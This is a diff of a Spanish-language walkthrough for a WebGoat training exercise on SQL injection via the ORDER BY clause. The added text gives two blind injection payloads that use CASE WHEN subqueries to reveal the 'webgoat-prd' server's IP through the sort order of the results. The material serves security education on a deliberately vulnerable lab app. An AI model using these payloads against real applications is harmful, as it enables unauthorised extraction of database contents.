@@ -243,12 +243,26 @@ Si se requiere proporcionar una columna de clasificación en la aplicación web,
 
 ## Ejercicio 3 (10)
 
-Para este ejercicio requerimos entender la lección de **Ordenar por cláusula** en la que 
+Para este ejercicio requerimos entender la lección de **Ordenar por cláusula** en la que nos mencionan la siguiente estructura que nos permite evaluar una expresión dentro del campo orden.
 
 ```sql
-column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)
+SELECT * FROM users ORDER BY (CASE WHEN (TRUE) THEN lastname ELSE firstname)
 ```
 
+Ahora el servidor del que nos piden conocer la IP tiene por nombre `webgoat-prd`. Por lo que cualquiera de las siguientes consultas debería arrojarnos el resutlado esperado:
+
+#### Nota importante: Pese a que la consulta es correcta el servidor nos arrojará un ERROR 400 en versiones modernas.
+
+## Método uno
 ```sql
-column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)
+column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd') = '192.168.3.3' THEN id ELSE hostname END)
 ```
++ Nos devolverá el ordenamiento por ID en caso de ser verdadero 
++ Nos devolverá el ordenamiento por HOSTNAME en caso de ser falso 
+
+## Método dos
+```sql
+column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd' AND substr(ip,1,1) = '1') IS NOT NULL THEN hostname ELSE id END)
+```
++ Nos devolverá el ordenamiento por HOSTNAME en caso de que el primer caracter de nuestra IP sea 1 
++ Nos devolverá el ordenamiento por id en caso de ser falso 
